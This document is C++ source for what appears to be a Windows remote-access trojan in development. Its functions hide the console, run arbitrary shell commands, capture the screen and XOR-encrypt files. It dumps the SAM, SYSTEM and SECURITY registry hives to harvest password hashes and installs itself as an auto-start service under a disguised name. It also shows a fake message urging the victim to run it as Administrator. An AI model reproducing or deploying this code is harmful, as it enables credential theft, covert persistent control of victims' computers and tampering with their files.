#include "httplib.h"
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <ctime>
#include <string>
#include <sstream>
#include <ctime>
#include <stdio.h>
#include "base64.cpp"
#include <Iphlpapi.h>
#include <Assert.h>
#pragma comment(lib, "iphlpapi.lib")

using namespace httplib;
using namespace std;

string ra_RunCommand(string ra_cmd);

string convertToString(char* a, int size)
{
    int i;
    string s = "";
    for (i = 0; i < size; i++) {
        s = s + a[i];
    }
    return s;
}


void ra_CapruteScreenAndSaveToFile()
{
    
    uint16_t BitsPerPixel = 24;
    uint32_t Width = GetSystemMetrics(SM_CXSCREEN);
    uint32_t Height = GetSystemMetrics(SM_CYSCREEN);
    BITMAPFILEHEADER Header;
    memset(&Header, 0, sizeof(Header));
    Header.bfType = 0x4D42;
    Header.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    BITMAPINFO Info;
    memset(&Info, 0, sizeof(Info));
    Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    Info.bmiHeader.biWidth = Width;
    Info.bmiHeader.biHeight = Height;
    Info.bmiHeader.biPlanes = 1;
    Info.bmiHeader.biBitCount = BitsPerPixel;
    Info.bmiHeader.biCompression = BI_RGB;
    Info.bmiHeader.biSizeImage = Width * Height * (BitsPerPixel > 24 ? 4 : 3);
    char* Pixels = NULL;
    HDC MemDC = CreateCompatibleDC(0);
    HBITMAP Section = CreateDIBSection(MemDC, &Info, DIB_RGB_COLORS, (void**)&Pixels, 0, 0);
    DeleteObject(SelectObject(MemDC, Section));
    BitBlt(MemDC, 0, 0, Width, Height, GetDC(0), 0, 0, SRCCOPY);
    DeleteDC(MemDC);
    char* buffer = (char*)malloc(sizeof(Header) + sizeof(Info.bmiHeader) + (((BitsPerPixel * Width + 31) & ~31) / 8) * Height);
    memcpy(buffer, (char*)&Header, sizeof(Header));
    memcpy(buffer + sizeof(Header), (char*)&Info.bmiHeader, sizeof(Info.bmiHeader));
    memcpy(buffer + sizeof(Header) + sizeof(Info.bmiHeader), Pixels, (((BitsPerPixel * Width + 31) & ~31) / 8) * Height);
    std::fstream hFile("foo.bmp", std::ios::out | std::ios::binary);
    hFile.write(buffer, sizeof(Header) + sizeof(Info.bmiHeader) + (((BitsPerPixel * Width + 31) & ~31) / 8) * Height);
    hFile.close();
    DeleteObject(Section);
    free(buffer);
}

string ra_RunCommand(string ra_cmd) {
    
    char   psBuffer[128];
    FILE* pPipe;
    string output;
    string temp;
    output = "";

    if ((pPipe = _popen(ra_cmd.c_str(), "rt")) == NULL)
        exit(1);
    while (fgets(psBuffer, 128, pPipe)) {
        output = output +  convertToString(psBuffer,128);
        printf(psBuffer);
    }
    return output;
}



void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

string encrypt(string msg,string key)
{
    string tmp(key);
    while (key.size() < msg.size())
        key += tmp;
    for (string::size_type i = 0; i < msg.size(); ++i)
        msg[i] ^= key[i];
    return msg;
}
string decrypt(string msg, string key)
{
    return encrypt(msg, key); 
}

void ra_encryptFile(string filename, string key) {
    string name;
    
    std::ifstream dataFile(filename);
    std::ofstream dataFileEnc;
    dataFileEnc.open(filename + "crypt");
    while (!dataFile.fail() && !dataFile.eof())
    {
        dataFile >> name;
        dataFileEnc << encrypt(name, key);
        cout << name << endl;
    }
    dataFile.close();
    dataFileEnc.close();
    ra_RunCommand("del /f test.txt");
}

void ra_DumpHash() {
    cout << ra_RunCommand("reg save HKLM\\SAM sam.save");
    Sleep(100);
    cout << ra_RunCommand("reg save HKLM\\SYSTEM system.save");
    Sleep(100);
    cout << ra_RunCommand("reg save HKLM\\SECURITY security.save");
    Sleep(100);

}

void ra_Startup(string Raname) {
    cout << ra_RunCommand("copy "+Raname+" C:\\Windows\\imtro.exe");
    Sleep(100);
    cout << ra_RunCommand("sc create imtro binpath=C:\\Windows\\imtro.exe start=auto");
    Sleep(100);
}



int ra_StartupCheck() {
    string racheck = ra_RunCommand("sc query imtro");
    if (racheck[0] == '['){
        return 0;
    }
    else {
        return 1;
    }
}

string ra_Listdir(string dir) {
    return ra_RunCommand("dir /b "+dir);
}


int main(int argc, char** argv)
{

    /*
    httplib::Client cli("www.google.com", 80);

    if (auto res = cli.Get("/")) {
        if (res->status == 200) {
            cout << res->body << endl;
        }
    } else {
        auto err = res.error();
    }
    */
    /*
    Server svr;
    
    svr.Get("/hi", [](const Request& req, Response& res) {
        res.set_content("Hello World!", "text/plain");
        });

    svr.listen("localhost", 1234);
    */
    HideConsole();
    MessageBoxW(NULL, L"Insufficient privileges, Please Run as an Administrator", L"Warning", MB_ICONEXCLAMATION | MB_OK);
    system("PAUSE");
    return 0;
}